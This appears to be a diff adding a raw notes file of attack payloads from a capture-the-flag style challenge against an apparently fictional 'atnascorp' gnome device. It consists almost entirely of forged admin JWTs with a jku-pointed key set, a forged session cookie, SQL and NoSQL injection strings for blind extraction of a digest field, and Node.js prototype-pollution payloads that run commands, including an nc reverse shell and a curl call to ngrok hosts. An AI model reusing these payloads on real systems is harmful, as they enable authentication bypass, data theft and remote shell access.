@@ -1,0 +1,72 @@
+curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTUxNDQ2OSwiZXhwIjoxNzY1NTE4MDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6IlRydWUifQ.kJxH3vbofDoKVeJop1jcwfbsA6_9xb9ncKVJx3V8sGMNJItDmtLk7zn7hl-VzP1-OCP40BVG8SzI7W407m2RVV6xw-X7YrGEITLOpcRfuO-A4dGX48kLryvxLS9lq4ipw7fwMuVXWfIdkFDa3iaaWOfTlNq0dF_l7Vp0ddYYvFiW7eQ--2Mex61TFv1o6MYVPF0j4HYKKSK_zfk3Os08QS0eZ0wGyTIIXpX3PU4_kK9UTm06LfYxyXJsiee5ZQAimjyJlX9wsKhit0jzi1UG1tDLJwJlUK93dD3MbWRxLv5Ayu2HVjVuS3aewILrJvITSOXn4OzeyImEcxoJB8TmYQ
+
+
+curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTUxNzMwOSwiZXhwIjoxNzY1NTIwOTA5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6IlRydWUifQ.wQ6dXGoSSFtoPG-gNDeI6DbSz8SWRM2I0DCSbjWzwZQyBx1BgQhR71rIOaDyAqHfXmXx3EPV52N1pj18HPSpHY30f4-Nek7gtJqBb4wigk7nTaRxTP7-ZuTaSJOg1WAa08nFLKs9m9MaKzLXk7cDNEiY695PvnavRfnqiUMsdE60Cdi9z30vEWERL3TUfIrn7GlYJmhG3tgrEBdkiDm2W8vok5t_put2bCvfKagHx2K1mv8lhvjRXioaqE2bhCtdgyXqKmMDVqa4Z5-uQLlphhN1rAjSZTuM5YIkrzHTytkBE51XYxdFRq3O6URPUWOmzKuIWxUo7qtBoqQqedKm6A
+
+
+Use the session id above to login as admin to get the firmware details
+
+
+curl -H 'Cookie: session=eyJhZG1pbiI6IlRydWUiLCJ1c2VybmFtZSI6Imdub21lIn0.aTuoIw.uQdtqKD03eXitVijT-XHlJAezVc' http://gnome-48371.atnascorp/diagnostic-interface
+
+echo '{
+  "keys": [
+    {
+      "kty": "RSA",
+      "kid": "idp-key-2025",
+      "use": "sig",
+      "n": "y7f3Y1UfwzOa6kmOK8YPNBThxblOEjjRfgtOeLWbO0gHrnCeEFhsGNvWRroX6bvwIEekgRBAch7-ikbIVve4r1G41PhH9UBwggglsOE41MEN8oe6G3tySbP3T95O2OiGqhMU4Ot_WYfQJk3K9r7Qe13JmCGuG_jBBh4ZjcOyiczct1qMqapYFJvHSbXZoHBoEEiq-8aGKoRM3eyODj1cBwrN9MkUo4HIPC2t6F6Meh8LkBuWoLsQKCTBIiy6U9aSOXl8tG1VlZJ0yP9UVwRULOTD-EayPsUZV5RQecp6iNEo7cURC1zEkgbu5-G0FIpvT3mBkCfI7nRjnYz1f4n5iw",
+      "e": "AQAB"
+    }
+  ]
+}' > jwks.json
+
+
+{"$ne":null}
+
+' OR 1=1 --
+
+bruce" AND IS_DEFINED(c.digest) -- '
+
+bruce" AND SUBSTRING(c.digest,POS,1)='CHAR' -- 
+
+hash
+digest
+token
+secret
+password
+checksum
+signature
+auth
+credential
+
+
+bruce%22%20AND%20IS_DEFINED(c.digest)%20--%20%27
+
+bruce" AND IS_DEFINED(c.digest) -- '
+
+
+{"settings":{"name":"GnomeBot34524","model_version":"2.3.8","firmware_version":"GNM-4.12.0"}}
+
+
+
+
+{"action":"update","key":"settings","subkey":"name","value":"poiuy"}
+
+
+%7B%22action%22%3A%22update%22%2C%22key%22%3A%22settings%22%2C%22subkey%22%3A%22name%22%2C%22value%22%3A%22poiuy%22%7D
+
+{"action":"update","key":"settings","subkey":"name","value":"poiuy"}
+
+{"action":"update","key":"__proto__","subkey":"outputFunctionName", "value":"test1;process.mainModule.require('child_process').execSync('$(whoami)');test2"}
+{"action":"update","key":"__proto__","subkey":"outputFunctionName", "value":"test1;process.mainModule.require('child_process').execSync('$(whoami)');test2"}
+
+
+
+{"action":"update", "key":"__proto__", "subkey":"outputFunctionName", "value":"test1;process.mainModule.require('child_process').execSync('$(nc -e /bin/sh 4.tcp.ngrok.io 13070)');test2"}
+
+{"action":"update", "key":"__proto__", "subkey":"outputFunctionName", "value":"test1;process.mainModule.require('child_process').execSync('$(nc -e /bin/sh 4.tcp.ngrok.io 13070)');test2"}
+
+
+
+{"action":"update", "key":"__proto__", "subkey":"outputFunctionName", "value":"test1;process.mainModule.require('child_process').execSync('$(curl https://transsepulchral-towardly-jazmin.ngrok-free.dev)');test2"}
